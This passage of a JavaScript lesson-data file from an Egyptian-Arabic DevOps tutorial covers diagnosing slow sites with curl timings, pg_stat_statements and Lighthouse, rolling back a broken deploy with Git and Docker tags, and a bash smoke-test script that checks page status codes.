// تكملة تاب diag: الأقسام دي بتتضاف للتاب اللي اتعرّف في js/tabs/diag/01.js (شرح حقول الدرس في أوله)
MORE("diag", [
    {
      t: "الأداء والحالات الغريبة",
      l: 3,
      n: "الموقع شغال بس فيه حاجة غلط: بطء، أو هجوم، أو حاجة بتحصل من غير ما تعرف",
      items: [
        {
          cmd: "الموقع بطيء مش واقع",
          title: "قيس قبل ما تخمّن",
          desc: "«بطيء» مش تشخيص. قيس: الوقت من السيرفر نفسه، ومن بره. لو من السيرفر سريع ومن بره بطيء: الشبكة أو حجم الصفحة. لو الاتنين بطيئين: التطبيق أو القاعدة. وبعدين الاستعلامات البطيئة والـ Long Tasks.",
          example: R`curl -o /dev/null -s -w "dns:%{time_namelookup} connect:%{time_connect} ttfb:%{time_starttransfer} total:%{time_total} size:%{size_download}\n" https://example.com
curl -o /dev/null -s -w "%{time_total}\n" http://127.0.0.1:3000/
docker exec db psql -U postgres -c "SELECT round(mean_exec_time) ms, calls, left(query,60) FROM pg_stat_statements ORDER BY total_exec_time DESC LIMIT 5;"
uptime && free -h | head -2
npx lighthouse https://example.com --preset=desktop --quiet --output=json | jq '.categories.performance.score'`,
          try: "ttfb كبير (أكتر من 500ms) والـ total قريب منه: السيرفر بطيء. ttfb صغير و total كبير: الصفحة تقيلة (صور، JS).",
          deep: {
            why: "«بطيء» ممكن يبقى DNS بطيء، أو السيرفر بعيد، أو الكود بطيء، أو الصفحة تقيلة، أو المتصفح بطيء. كل واحد حل مختلف. القياس بيفرّق بينهم.",
            how: R`الأمر الأول بيقسم وقت الطلب لمراحل: [[time_namelookup]] DNS، و [[time_connect]] الاتصال (بيعكس المسافة للسيرفر)، و [[time_starttransfer]] (TTFB) لحد أول byte من الرد، وده وقت السيرفر بيفكّر فيه، و [[time_total]] الكل، و [[size_download]] الحجم.

القراية: TTFB كبير (أكتر من نص ثانية) = السيرفر أو التطبيق أو القاعدة. TTFB صغير و total كبير = الصفحة نفسها تقيلة أو الاتصال بطيء. connect كبير = السيرفر بعيد جغرافيًا أو الشبكة (CDN بيحل).

الأمر التاني من السيرفر نفسه بيشيل الشبكة من المعادلة: لو سريع هنا وبطيء من بره، المشكلة شبكة أو Nginx (gzip، كاش، HTTP/2).

[[pg_stat_statements]]: أعلى استعلامات في الوقت الإجمالي. غالبًا استعلام واحد أو اتنين هما ٨٠٪ من المشكلة.

[[uptime && free]]: السيرفر مش مخنوق؟

[[lighthouse]]: لو السيرفر سريع، المشكلة في الـ frontend (JS كبير، صور مش مضغوطة)، وده تاب المتصفح.`,
            when: "أي شكوى بطء. وقياس دوري كل أسبوع تشوف الاتجاه.",
            mistakes: "تكبّر السيرفر قبل ما تقيس. غالبًا index ناقص أو صورة ٥ ميجا، والسيرفر مش المشكلة."
          },
          teach: R`## الفكرة: «بطيء» لازم يتحوّل لأرقام

الطلب الواحد بيعدّي على مراحل: DNS، والاتصال، والسيرفر بيفكّر، والتحميل، والمتصفح بيرسم. كل مرحلة ليها حل مختلف تمامًا. الأوامر بتقيس كل مرحلة لوحدها، فتعرف تصلّح فين.

الناتج تحت متجرّب: أول أمر على [[example.com]] الحقيقي من container أوبونتو 24.04، والقاعدة على Postgres 16 في Docker فيه جدول [[orders]] بـ ٣٠٠ ألف صف، و Lighthouse اتشغّل على ويندوز بـ Chrome.

---

## ١. الأمر الطويل: [[curl -w]] بيقسّم الوقت

~~~bash
curl -o /dev/null -s -w "dns:%{time_namelookup} connect:%{time_connect} ttfb:%{time_starttransfer} total:%{time_total} size:%{size_download}\n" https://example.com
~~~

[[-o /dev/null]] ارمي الصفحة، و [[-s]] من غير شريط تقدم، و [[-w]] (write-out) اطبع النص ده بعد ما تخلص. وكل [[%{...}]] متغير بيملاه curl:

كل الأوقات بالثواني، ومحسوبة من **بداية** الطلب:

| المتغير | بيقيس |
|---|---|
| [[time_namelookup]] | لحد ما DNS رد بالـ IP |
| [[time_connect]] | لحد ما اتصال TCP اتعمل |
| [[time_starttransfer]] | لحد أول بايت من الرد = TTFB (Time To First Byte) |
| [[time_total]] | لحد آخر بايت |
| [[size_download]] | حجم الرد بالبايت |

شغّلته مرتين ورا بعض:

~~~text الناتج
dns:0.061328 connect:0.125613 ttfb:0.231782 total:0.231843 size:577
dns:0.002373 connect:0.043194 ttfb:0.174208 total:0.174274 size:577
~~~

### إزاي تقراه

الأرقام **تراكمية**، فكل مرحلة = الرقم ناقص اللي قبله. في السطر التاني:

| المرحلة | الحساب | الوقت |
|---|---|---|
| DNS | 0.002 | ٢ مللي ثانية |
| الاتصال | 0.043 − 0.002 | ٤١ مللي ثانية |
| TLS + السيرفر بيفكّر | 0.174 − 0.043 | ١٣١ مللي ثانية |
| التحميل | 0.17427 − 0.17421 | تقريبًا صفر (الصفحة ٥٧٧ بايت بس) |

وليه الـ DNS نزل من ٦١ لـ ٢ مللي في المرة التانية؟ لأن الإجابة اتحفظت في الكاش بعد أول مرة. عشان كده قيس كذا مرة.

| لو | يبقى |
|---|---|
| ttfb كبير (أكتر من نص ثانية) و total قريب منه | السيرفر بطيء: التطبيق أو القاعدة |
| ttfb صغير و total كبير | الرد تقيل (حجم كبير) أو النت بطيء |
| connect كبير | السيرفر بعيد جغرافيًا، و CDN بيحل |

---

## ٢. [[curl -o /dev/null -s -w "%{time_total}\n" http://127.0.0.1:3000/]]

نفس القياس **من على السيرفر** للتطبيق مباشرة. كده شلت النت و DNS و TLS و Nginx من المعادلة:

~~~text الناتج (تطبيق تجريبي)
0.002129
~~~

٢ مللي. لو من بره ثانيتين ومن هنا ٢ مللي، التطبيق بريء: دوّر في الشبكة أو Nginx (ضغط gzip، الكاش، الملفات التقيلة).

---

## ٣. أتقل الاستعلامات: [[pg_stat_statements]]

~~~bash
docker exec db psql -U postgres -c "SELECT round(mean_exec_time) ms, calls, left(query,60) FROM pg_stat_statements ORDER BY total_exec_time DESC LIMIT 5;"
~~~

[[pg_stat_statements]] إضافة (extension) في Postgres بتسجّل كل استعلام: اتنفّذ كام مرة وأخد قد إيه. لازم تتفعّل الأول: [[shared_preload_libraries=pg_stat_statements]] في الإعدادات + ريستارت، وبعدين [[CREATE EXTENSION pg_stat_statements;]] مرة واحدة. من غيرهم الأمر بيطلع error إن الجدول مش موجود.

| الحتة | معناها |
|---|---|
| [[mean_exec_time]] | متوسط وقت المرة الواحدة بالمللي ثانية، و [[round()]] بيقرّب، و [[ms]] اسم العمود |
| [[calls]] | اتنفّذ كام مرة |
| [[left(query,60)]] | أول ٦٠ حرف من الاستعلام |
| [[ORDER BY total_exec_time DESC]] | رتّب بـ **إجمالي** الوقت (المتوسط × العدد)، الأكبر الأول |

~~~text الناتج
   ms   | calls |                             left
--------+-------+--------------------------------------------------------------
 240062 |     1 | SELECT pg_sleep($1), count(*) FROM pg_class
   1400 |     1 | INSERT INTO orders(user_id,total) SELECT (random()*$1)::int,
     16 |    20 | SELECT count(*) FROM orders WHERE user_id = $1
     60 |     1 | CREATE DATABASE "app"
     23 |     1 | CREATE TABLE "User" ("id" SERIAL PRIMARY KEY, "email" TEXT N
~~~

لاحظ [[$1]]: Postgres بيشيل القيم ويحط مكانها [[$1]] و [[$2]]، فكل الطلبات اللي بنفس الشكل بتتجمع في سطر واحد (الـ ٢٠ استعلام بـ [[user_id]] مختلف بقوا سطر واحد بـ [[calls 20]]).

السطر التالت هو اللي يهمك في موقع حقيقي: ١٦ مللي للمرة، بس بيتكرر. لو اتنفّذ مليون مرة في اليوم، ده أكبر مستهلك. السبب هنا إن [[user_id]] مالوش index، فـ Postgres بيقرا الـ ٣٠٠ ألف صف كل مرة. (أول سطر هو استعلام [[pg_sleep]] بتاع درس الـ 504، فضل متسجل.)

---

## ٤. [[uptime && free -h | head -2]]

السيرفر نفسه مخنوق؟

~~~text الناتج
 13:17:16 up  6:41,  0 user,  load average: 1.63, 1.49, 1.23
               total        used        free      shared  buff/cache   available
Mem:            15Gi       1.4Gi       3.6Gi        85Mi        10Gi        13Gi
~~~

load قليل بالنسبة لـ ١٦ نواة، و [[available]] ١٣ جيجا. السيرفر مرتاح، فالبطء مش من الموارد. ([[head -2]] سطر العناوين وسطر الرام بس، من غير الـ swap.)

---

## ٥. [[npx lighthouse https://example.com --preset=desktop --quiet --output=json | jq '.categories.performance.score']]

- [[npx lighthouse]] شغّل أداة Lighthouse بتاعة جوجل (بتنزل لوحدها أول مرة)، وهي بتفتح Chrome وتحمّل الصفحة وتقيس كل حاجة.
- [[--preset=desktop]] قيس كأنه كمبيوتر (الافتراضي موبايل بنت بطيء).
- [[--quiet]] من غير رسايل التقدم.
- [[--output=json]] النتيجة JSON بدل HTML.
- [[jq '.categories.performance.score']] [[jq]] أداة بتقرا JSON: هات خانة [[categories]] وجواها [[performance]] وجواها [[score]].

على ويندوز مكانش عندي [[jq]]، فاستخدمت بديل PowerShell:

~~~powershell
$r = npx --yes lighthouse https://example.com --preset=desktop --quiet --output=json --chrome-flags="--headless=new"
($r -join "$__bt"n" | ConvertFrom-Json).categories.performance.score
~~~

~~~text الناتج
1
~~~

الدرجة من 0 لـ 1، يعني 1 = ١٠٠/١٠٠ (example.com صفحة نص صغيرة). موقع عليه صور كبيرة و JS كتير ممكن يطلع 0.4. ولو السيرفر سريع (ttfb صغير) والدرجة واطية، المشكلة في الواجهة: الصور والـ JS، وده تاب المتصفح.

---

## الجدول

| الأمر | بيقيس | لو بطيء، الحل |
|---|---|---|
| [[curl -w]] من بره | كل مرحلة | حسب المرحلة |
| [[curl -w]] من السيرفر | التطبيق لوحده | لو سريع: الشبكة أو Nginx |
| [[pg_stat_statements]] | أتقل استعلامات بالإجمالي | index، أو كاش |
| [[uptime]] و [[free]] | السيرفر مخنوق؟ | موارد أكتر أو حدود |
| [[lighthouse]] | الواجهة | ضغط الصور، تقسيم الـ JS |

## الخلاصة

- أرقام [[curl -w]] تراكمية: اطرح عشان تعرف كل مرحلة.
- TTFB هو وقت السيرفر. لو صغير، متكبّرش السيرفر.
- رتّب الاستعلامات بالإجمالي، مش بالأبطأ مرة واحدة.`,
          lines: [
            "وقت الطلب مقسّم: DNS، واتصال، و TTFB (السيرفر)، والكل، والحجم.",
            "من السيرفر نفسه: يشيل الشبكة من المعادلة.",
            "أثقل ٥ استعلامات في الوقت الإجمالي.",
            "السيرفر مخنوق؟",
            "درجة الأداء من Lighthouse (لو السيرفر سريع، المشكلة frontend)."
          ],
          sol: R`القاعدة: قيس قبل ما تخمّن. أول أمر [[curl -w]] بيفصّل الوقت. جربته وطلع بالشكل:

[[dns:0.000016 connect:0.000099 ttfb:0.000791 total:0.000868 size:572]]

اقرا الأرقام: [[ttfb]] (time to first byte) كبير = السيرفر بيفكّر كتير قبل ما يرد (تطبيق أو قاعدة بطيئة). [[ttfb]] صغير بس [[total]] كبير = الرد نفسه تقيل (صور، JS كبير، HTML ضخم). [[connect]] كبير = مشكلة شبكة أو TLS. الفصل ده بيوجّهك للطبقة الصح.

[[pg_stat_statements]] بيرتّب الاستعلامات بإجمالي الوقت، فبيوريك الاستعلام اللي بيستهلك أكتر حاجة (لازم الـ extension مفعّلة). [[uptime]] و[[free]] بيوريّوك لو السيرفر نفسه مخنوق. [[lighthouse]] بيدرّج أداء الواجهة. الخلاصة: بطء الـ backend (ttfb) بيتحل بـ indexes وcaching؛ بطء الـ frontend (total) بيتحل بضغط الصور وتقسيم الـ JS. راجع «تاب المتصفح» للأداء.`
        },
        {
          cmd: "الـ deploy كسر الموقع",
          title: "ارجع الأول، افهم بعدين",
          desc: "بعد deploy الموقع وقع. القاعدة: الرجوع لآخر نسخة شغالة أولوية على الفهم. مع Git و Docker الرجوع دقيقة: checkout آخر commit شغال وأعد البناء، أو شغّل الـ image السابقة. وبعدين افهم على مهلك في branch.",
          example: R`git log --oneline -5
git checkout HEAD~1 -- . && docker compose up -d --build api
docker images myapi --format '{{.Tag}} {{.CreatedAt}}' | head
docker compose logs --tail 30 api
npx prisma migrate status
git checkout HEAD -- . && git revert HEAD --no-edit`,
          try: "جرّب على سيرفر التجربة: اعمل commit يكسر التطبيق عمدًا، وقيس كام دقيقة بتاخد لحد ما ترجّعه. لو أكتر من ٥، اكتب سكربت rollback.",
          flag: "danger",
          deep: {
            why: "الموقع كان شغال قبل الـ deploy بدقيقة. أسرع تشخيص هو الرجوع للنسخة اللي قبلها. الفهم بعدين، في branch، على مهلك.",
            how: R`[[git log]]: آخر commits. اللي قبل الأخير هو اللي كان شغال.

الرجوع بالكود: [[git checkout HEAD~1 -- .]] بيرجّع ملفات الـ commit السابق (من غير ما يغيّر الـ branch)، بس مش بيمسح الملفات الجديدة اللي الـ commit الأخير ضافها، و [[up -d --build]] يعيد البناء. دقيقتين والموقع رجع.

الرجوع بالـ image (أسرع لو الصور بأرقام نسخ): [[docker images]] بيوريك النسخ الموجودة، تغيّر الـ tag في compose للسابقة و [[up -d]]. ثواني.

[[migrate status]]: الخطر الحقيقي. لو الـ deploy عمل migration (مسح عمود مثلًا)، الكود القديم مش هيشتغل مع الـ schema الجديد. عشان كده الـ migrations الكاسرة بتتعمل على خطوتين (شرحناه في PostgreSQL).

بعد ما الموقع يرجع: [[git revert HEAD]] بيعمل commit جديد بيلغي الأخير، فالتاريخ نضيف والـ branch متسقة. وبعدين تصلّح في branch.

الدرس: deploy لـ staging الأول، أو على الأقل health check أوتوماتيك بعد deploy يرجّع لوحده لو فشل (سكربت deploy.sh في bash المستوى ٣ فيه الـ check).`,
            when: "أي كسر بعد deploy مباشرة. الرجوع في أقل من ٥ دقايق هدف.",
            mistakes: "تحاول تصلّح على الإنتاج وهو واقع. ارجع الأول. و deploy فيه migration كاسرة من غير خطة رجوع."
          },
          teach: R`## الفكرة: رجّع اللي كان شغال في دقيقتين، وبعدين افهم على مهلك

بعد deploy كسر الموقع، كل دقيقة بتفكّر فيها الموقع واقع. الأسرع إنك ترجع للنسخة اللي قبلها (اللي كانت شغالة من دقيقة)، وبعد ما الموقع يرجع تدوّر على السبب.

عملت ده في معمل: سيرفر Ubuntu 24.04 جوه Docker عليه Docker Engine و Compose، ومشروع صغير في [[/srv/myapi]] فيه Git: commit «API v1»، و «Add caching (v2)» (شغال)، وبعدين «Read DATABASE_URL at boot» (مكسور: بينادي أمر مش موجود).

~~~text بعد الـ deploy المكسور
myapi-api-1   myapi:latest   "sh /server.sh"   api   15 seconds ago   Restarting (127) 1 second ago
curl: (7) Failed to connect to 127.0.0.1 port 3100 after 0 ms: Couldn't connect to server
~~~

---

## ١. [[git log --oneline -5]]

~~~text الناتج
9ac2d61 Read DATABASE_URL at boot
2d0ec6a Add caching (v2)
70d2d47 API v1
~~~

الأعلى هو الأحدث ([[HEAD]]) وهو اللي كسر. اللي تحته ([[HEAD~1]]) كان شغال.

---

## ٢. [[git checkout HEAD~1 -- . && docker compose up -d --build api]]

### [[git checkout HEAD~1 -- .]]

- [[HEAD]] الـ commit الحالي، و [[~1]] «واحد قبله». [[HEAD~2]] اتنين قبله، وهكذا.
- [[--]] فاصل معناه «اللي بعدي مسارات ملفات، مش اسم branch».
- [[.]] كل الملفات في الفولدر الحالي.

يعني: «هات الملفات زي ما كانت في الـ commit اللي فات، وحطها مكان الحالية». الـ branch نفسه مبيتغيرش (لسه على [[9ac2d61]])، بس الملفات رجعت. و [[git status --short]] بعدها:

~~~text الناتج
M  server.sh
~~~

[[M]] يعني الملف ده متعدّل عن الـ commit الحالي (رجع للنسخة القديمة).

> الأمر ده مش بيمسح ملفات **جديدة** الـ commit المكسور ضافها. لو فيه ملف جديد بيعمل المشكلة، هيفضل موجود.

### [[docker compose up -d --build api]]

[[--build]] ابني الـ image من الملفات الحالية (اللي رجعت) قبل التشغيل، و [[-d]] في الخلفية.

~~~text docker compose ps بعدها
myapi-api-1   myapi:latest   "sh /server.sh"   api   3 seconds ago   Up 3 seconds   127.0.0.1:3100->3000/tcp
~~~

---

## ٣. [[docker images myapi --format '{{.Tag}} {{.CreatedAt}}' | head]]

الطريقة الأسرع لو كل build بيتعمله tag برقم نسخة: مفيش build خالص، بتشغّل image قديمة موجودة.

~~~text الناتج
1.0 2026-10-06 13:20:45 +0000 UTC
1.1 2026-10-06 13:20:45 +0000 UTC
latest 2026-10-06 13:20:17 +0000 UTC
~~~

[[{{.Tag}}]] اسم النسخة و [[{{.CreatedAt}}]] اتعملت امتى. (الوقت هنا وقت بناء الـ layers، فـ 1.0 و 1.1 طلعوا زي بعض لأن Docker استخدم الكاش. متعتمدش على الوقت، اعتمد على رقم النسخة.)

في الـ compose.yaml بتاعي السطر [[image: myapi:$__{TAG:-latest}]]، يعني النسخة جاية من متغير [[TAG]]، ولو مش موجود [[latest]]. فالرجوع لـ 1.0:

~~~bash
TAG=1.0 docker compose up -d api
~~~

~~~text الناتج
myapi-api-1 myapi:1.0 Up 2 seconds
api-1  | api v1 started
~~~

ثواني، ومن غير ما تلمس Git. ده ليه الـ tags بأرقام أحسن من [[latest]] بس.

---

## ٤. [[docker compose logs --tail 30 api]]

اتأكد إنه رجع فعلًا:

~~~text الناتج
api-1  | api v2 started
~~~

و [[curl http://127.0.0.1:3100/]] رجّع [[ok]]. الموقع رجع.

---

## ٥. [[npx prisma migrate status]]

ده الفخ الكبير: الكود رجع، بس **القاعدة** مرجعتش. لو الـ deploy المكسور عمل migration (مسح عمود، غيّر اسم جدول)، الكود القديم هيدوّر على حاجة مش موجودة. الأمر ده بيقولك هل فيه migrations اتطبقت، وشكل ناتجه في درس «500 من التطبيق». (المشروع التجريبي هنا مفيهوش Prisma.)

---

## ٦. [[git checkout HEAD -- . && git revert HEAD --no-edit]]

دلوقتي الموقع شغال بملفات قديمة والـ Git لسه بيقول إن آخر commit هو المكسور. لازم الاتنين يتفقوا.

### ليه [[git checkout HEAD -- .]] الأول؟

جرّبت [[revert]] على طول والملفات لسه متعدّلة:

~~~text الناتج
error: your local changes would be overwritten by revert.
hint: commit your changes or stash them to proceed.
fatal: revert failed
~~~

[[revert]] بيرفض يشتغل لو فيه تعديلات مش متسجلة. فبترجّع الملفات لـ [[HEAD]] الأول (ده مش هيأثر على الـ container الشغال، هو اتبنى خلاص).

### [[git revert HEAD --no-edit]]

[[revert]] بيعمل commit **جديد** عكس الـ commit المحدد: اللي اتضاف يتشال واللي اتشال يرجع. و [[--no-edit]] استخدم الرسالة الافتراضية من غير ما يفتح محرر.

~~~text الناتج
[main 8fa8dd4] Revert "Read DATABASE_URL at boot"
 1 file changed, 6 insertions(+), 2 deletions(-)
~~~

~~~text git log --oneline بعدها
8fa8dd4 Revert "Read DATABASE_URL at boot"
9ac2d61 Read DATABASE_URL at boot
2d0ec6a Add caching (v2)
70d2d47 API v1
~~~

التاريخ كامل وواضح: حصل إيه واترجع امتى. والملفات دلوقتي زي v2 بالظبط ([[head -1 server.sh]] طلّع [[echo "api v2 started"]]). ليه مش [[git reset --hard HEAD~1]]؟ لأن [[reset]] بيمسح الـ commit من التاريخ، ولو كنت عملت push، هيلخبط أي حد تاني سحب الكود.

---

## الجدول

| الخطوة | الأمر | الوقت |
|---|---|---|
| مين كسر | [[git log --oneline -5]] | ثواني |
| رجوع بالكود | [[git checkout HEAD~1 -- .]] و [[up -d --build]] | دقيقة أو اتنين (build) |
| أو رجوع بالـ image | [[TAG=1.0 docker compose up -d]] | ثواني |
| اتأكد | [[compose logs]] و curl | ثواني |
| القاعدة؟ | [[prisma migrate status]] | ثواني |
| نضّف Git | [[checkout HEAD -- .]] ثم [[revert HEAD]] | ثواني |

## الخلاصة

- رجّع الأول. الفهم بعدين، في branch.
- tag بأرقام النسخ بيخلي الرجوع ثواني بدل build.
- الكود بيرجع، الـ migrations لأ. خطط لها قبل الـ deploy.`,
          lines: [
            "آخر commits: اللي قبل الأخير كان شغال.",
            "رجّع ملفات الـ commit السابق وأعد البناء (دقيقتين).",
            "أو الصور الموجودة بأرقامها: غيّر الـ tag في compose للسابقة.",
            "اتأكد إنه رجع.",
            "الخطر: migration اتطبقت والكود القديم مش هيشتغل معاها.",
            "بعد ما يرجع: رجّع الملفات لـ HEAD (revert بيرفض لو فيه تعديلات)، وبعدين commit بيلغي الأخير."
          ],
          sol: R`القاعدة الذهبية: رجّع الأول، افهم بعدين. المستخدمين مش هيستنوك تدبّج. [[git log --oneline -5]] بيوريك آخر commits، و [[git checkout HEAD~1 -- . && docker compose up -d --build]] بيرجّع الكود للنسخة اللي قبل الكسر ويبني تاني. لو الموقع رجع، يبقى المشكلة في آخر commit.

بس خد بالك من حاجتين مش بيرجعوا مع الكود: الـ database migrations (لو الـ deploy عمل migration كسر، الـ rollback للكود مش بيرجّع الـ schema، شوف [[prisma migrate status]] واعمل migration عكسي)، ومتغيرات البيئة. عشان كده [[docker images myapi --format '{{.Tag}} {{.CreatedAt}}']] مفيد: لو محتفظ بالـ image القديمة بـ tag، ترجّعها فورًا من غير build.

بعد ما يرجع، [[git revert HEAD --no-edit]] بيعمل commit بيلغي التغيير (أنضف من checkout لأنه بيحافظ على التاريخ). التمرين المهم: اكسر شيء عمدًا على سيرفر تجربة وقيس كام دقيقة الـ rollback بياخد. لو أكتر من ٥ دقايق، اكتب [[rollback.sh]] جاهز. flag danger. راجع «تاب Git».`
        },
        {
          cmd: "smoke test",
          title: "كل الصفحات المهمة بترد صح بعد الـ deploy؟",
          desc: "بعد كل deploy، لوب curl على أهم الصفحات ويطبع الـ status لكل واحدة. في ثانيتين تعرف لو صفحة بقت 500. وضيف رابط مش موجود: لازم يرجع 404، لأن SPA أو PHP متظبطين غلط بيرجّعوا 200 لأي حاجة. والسكربت يرجع exit code فتقدر توقف أو ترجّع الـ deploy لو فشل.",
          example: R`fail=0
for u in / /login /contact /api/health; do
  code=$(curl -s -o /dev/null --max-time 10 -w "%{http_code}" "https://example.com$u")
  echo "$u $code"; [ "$code" = "200" ] || fail=1
done
code=$(curl -s -o /dev/null --max-time 10 -w "%{http_code}" https://example.com/nope-404)
echo "/nope-404 $code"; [ "$code" = "404" ] || fail=1
exit $fail`,
          try: "احفظه [[smoke.sh]] وشغّله بعد deploy على سيرفر التجربة، و [[echo $?]] بعده. بعدين اكسر صفحة عمدًا وشوف الرقم بقى 1.",
          deep: {
            why: "الـ deploy «نجح» معناها إن الأوامر خلصت، مش إن الموقع شغال. صفحة login ممكن تبقى 500 بسبب متغير ناقص، والصفحة الرئيسية شغالة فمتاخدش بالك غير لما عميل يشتكي.",
            how: R`[[-o /dev/null]]: ارمي الصفحة. [[-s]]: من غير progress. [[-w "%{http_code}"]]: اطبع الـ status بس. [[--max-time 10]]: متستناش أكتر من ١٠ ثواني، وإلا سيرفر معلّق يخلي السكربت يقف للأبد (timeout بيطلع [[000]]).

[[fail]] بيبدأ صفر، وأي صفحة مش 200 تخليه 1. و [[exit $fail]] في الآخر، فسكربت الـ deploy يقدر يعمل [[./smoke.sh || rollback]].

ليه [[/nope-404]]؟ لو رجع 200، يبقى أي رابط غلط بيرجّع صفحة «نجاح»: جوجل يأرشف آلاف الصفحات الوهمية، والملفات الناقصة بترجع HTML (فولدر التحميلات في تاب nginx). ده مش هيبان غير في فحص زي ده.

شغّله من بره السيرفر (جهازك أو CI)، عشان يعدّي بنفس طريق الزوار: DNS و Cloudflare و SSL. من جوه السيرفر على 127.0.0.1 بيختبر التطبيق بس.

وضيف عليه أي حاجة مهمة: [[/.git/config]] لازم 403 أو 404، و [[/api/health]] فيه اتصال بقاعدة البيانات.`,
            when: "آخر خطوة في أي سكربت deploy، وبعد أي تعديل في Nginx أو .htaccess.",
            mistakes: "في مشروع حقيقي فحص ما بعد الـ deploy كان curl من غير [[--max-time]] فعلى سيرفر بطيء بيعلق، ومن غير ما يفحص إن الـ 404 فعلًا 404. وتفحص الصفحة الرئيسية بس، وهي غالبًا آخر صفحة بتقع."
          },
          teach: R`## الفكرة: سكربت بيسأل كل صفحة مهمة «انتي تمام؟»

بعد أي deploy، السكربت ده بيطلب كل صفحة مهمة ويطبع الـ status بتاعها، ويطلب صفحة **مش موجودة** ويتأكد إنها 404. ولو أي حاجة غلط، بيخرج بكود 1، فسكربت الـ deploy يقدر يوقف أو يرجّع لوحده.

جرّبته من container أوبونتو 24.04 على سيرفر تجريبي عليه Nginx وتطبيق، وغيّرت إعدادات Nginx كذا مرة عشان أشوف كل حالة. (الدومين في المعمل متوجّه للسيرفر التجريبي، وعلى [[http]] بدل [[https]] لأن شهادته تجريبية.)

---

## السطر بالسطر

### [[fail=0]]

متغير اسمه [[fail]] قيمته صفر. ده «العلم»: صفر = لسه مفيش مشكلة. (في bash مفيش مسافات حوالين [[=]]، و [[fail = 0]] هيدّي error.)

### [[for u in / /login /contact /api/health; do]]

[[for]] بيلف على الكلمات دي واحدة واحدة، وكل لفة بيحط الكلمة في المتغير [[u]]. و [[do]] بداية اللي هيتكرر. دي الصفحات اللي لو وقعت الزباين هتحس.

### [[code=$(curl -s -o /dev/null --max-time 10 -w "%{http_code}" "https://example.com$u")]]

من جوه لبره:

| الحتة | معناها |
|---|---|
| [[curl ... "https://example.com$u"]] | اطلب الصفحة. [[$u]] بيتبدل بالصفحة الحالية، فأول لفة [[https://example.com/]] |
| [[-s]] | من غير شريط تقدم |
| [[-o /dev/null]] | ارمي محتوى الصفحة |
| [[--max-time 10]] | لو مخلصش في ١٠ ثواني، اقطع |
| [[-w "%{http_code}"]] | اطبع الـ status بس (200، 404، ...) |
| [[$(...)]] | نفّذ اللي جوه وحط **ناتجه** مكانه |
| [[code=]] | خزّن الناتج في متغير [[code]] |

### [[echo "$u $code"; [ "$code" = "200" ] || fail=1]]

- [[echo "$u $code"]] اطبع الصفحة والـ status، زي [[/login 200]].
- [[;]] وبعدين نفّذ اللي بعده.
- [[[ "$code" = "200" ]]] اختبار: هل [[code]] بيساوي 200؟ الأقواس المربعة أمر اسمه [[test]]، والمسافات جوه الأقواس **لازم**.
- [[||]] «لو اللي قبلي فشل، نفّذ اللي بعدي». يعني لو مش 200، [[fail=1]].

### [[done]]

نهاية اللوب.

### صفحة الـ 404

~~~bash
code=$(curl -s -o /dev/null --max-time 10 -w "%{http_code}" https://example.com/nope-404)
echo "/nope-404 $code"; [ "$code" = "404" ] || fail=1
~~~

نفس الفكرة، بس على صفحة مش موجودة، والمتوقع [[404]].

### [[exit $fail]]

اخرج من السكربت بكود = قيمة [[fail]]. صفر = نجاح، ١ = فيه حاجة غلط. وده اللي [[$?]] بيقراه بعدها.

---

## اللي حصل في المعمل

### ١. تطبيق بيرد ٢٠٠ على أي حاجة

في الأول Nginx كان بيبعت كل الطلبات للتطبيق، والتطبيق بيرد 200 على أي مسار:

~~~text الناتج
/ 200
/login 200
/contact 200
/api/health 200
/nope-404 200
exit=1
~~~

كل الصفحات «شغالة»، والسكربت فشل! لأن صفحة مش موجودة رجعت 200. ده بالظبط اللي بيحصل مع SPA أو PHP متظبطين غلط: جوجل بيأرشف أي رابط غلط كأنه صفحة حقيقية.

### ٢. بعد ما خليت Nginx يرجّع 404 للمسارات المجهولة

~~~text الناتج
/ 200
/login 200
/contact 200
/api/health 200
/nope-404 404
exit=0
~~~

### ٣. كسرت /login (بترجع 500)

~~~text الناتج
/ 200
/login 500
/contact 200
/api/health 200
/nope-404 404
exit=1
~~~

الصفحة الرئيسية سليمة، فلو كنت فاتح الموقع بعينك مكنتش هتاخد بالك.

### ٤. خليت /contact معلّقة (بترد بعد ٧٠ ثانية)

~~~text الناتج
/ 200
/login 500
/contact 000
/api/health 200
/nope-404 404
exit=1

real	0m10.045s
~~~

[[000]] يعني curl ماخدش رد خالص (قطع عند ١٠ ثواني). والسكربت كله خلص في ١٠ ثواني بس بفضل [[--max-time]]. من غيرها كان هيستنى لحد ما Nginx يقطع (٦٠ ثانية)، ولو السيرفر معلّق خالص ممكن يقف للأبد.

---

## استخدامه بعد الـ deploy

احفظه [[smoke.sh]] (الـ solCode فيه سطر [[#!/usr/bin/env bash]] في الأول عشان يتشغّل بـ [[./smoke.sh]] بعد [[chmod +x]]):

~~~bash
./smoke.sh && echo "deploy ok" || ./rollback.sh
~~~

[[&&]] لو نجح (exit 0) اطبع ok، [[||]] لو فشل شغّل الرجوع.

## الجدول

| الحالة | السكربت طبع | exit |
|---|---|---|
| كله سليم و 404 حقيقية | كله 200 و [[/nope-404 404]] | 0 |
| أي رابط بيرد 200 | [[/nope-404 200]] | 1 |
| صفحة بتقع | [[/login 500]] | 1 |
| صفحة معلّقة | [[/contact 000]] بعد ١٠ ثواني | 1 |

## الخلاصة

- «الـ deploy خلص» مش معناه «الموقع شغال». اسأل الصفحات.
- [[--max-time]] دايمًا، وإلا السكربت نفسه يعلّق.
- افحص الـ 404 كمان، مش الـ 200 بس.`,
          lines: [
            "عداد الفشل.",
            "الصفحات المهمة.",
            "الـ status بس، ومهلة ١٠ ثواني.",
            "اطبعه، ولو مش 200 علّم فشل.",
            "نهاية اللوب.",
            "رابط مش موجود...",
            "...لازم 404 مش 200.",
            "exit code: صفر لو كله تمام."
          ],
          sol: R`السكربت بيلف على الصفحات المهمة، بيطلب كل واحدة، وبيتأكد إنها بترجّع الكود المتوقع. جربت نسخة منه على سيرفر محلي وطلع:

[[/ 200]]
[[/nope 404]]
[[exit=1]]

الفكرة العبقرية في السطر بتاع 404: مش بس بيتأكد إن الصفحات الشغالة بترد 200، بيتأكد كمان إن صفحة مش موجودة بترد 404 (مش 200). ده بيكشف لو الـ routing باظ وبقى كله بيرجّع الصفحة الرئيسية. لو أي شرط فشل، [[fail=1]] و [[exit $fail]] بيخلّي السكربت يخرج بكود 1.

